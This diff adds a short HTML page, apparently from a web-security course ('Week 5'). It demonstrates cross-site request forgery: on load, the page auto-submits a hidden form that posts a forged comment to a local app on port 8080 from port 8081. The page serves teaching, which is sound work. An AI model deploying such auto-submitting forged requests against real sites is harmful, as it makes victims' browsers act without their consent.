@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>Week 5 same-site, cross-origin attacker</title>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:8080/comments" method="POST">
+    <input name="body" value="Forged comment from port 8081">
+  </form>
+</body>
+</html>
